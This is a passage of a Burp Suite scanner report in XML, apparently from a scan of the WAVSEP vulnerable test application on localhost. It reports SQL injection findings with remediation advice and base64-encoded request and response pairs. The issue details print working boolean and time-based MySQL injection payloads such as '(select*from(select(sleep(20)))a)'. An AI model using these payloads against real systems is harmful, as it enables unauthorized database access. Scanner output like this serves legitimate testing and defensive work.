      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjMyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>935748753070218240</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>38350246 or 4758=04758</b> and <b>50705506 or 8005=8012</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTM4MzUwMjQ2JTIwb3IlMjA0NzU4JTNkMDQ3NTg=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTUwNzA1NTA2JTIwb3IlMjA4MDA1JTNkODAxMg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4349821529508457472</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>90996709 or 6025=06025</b> and <b>79338704 or 4133=4135</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtT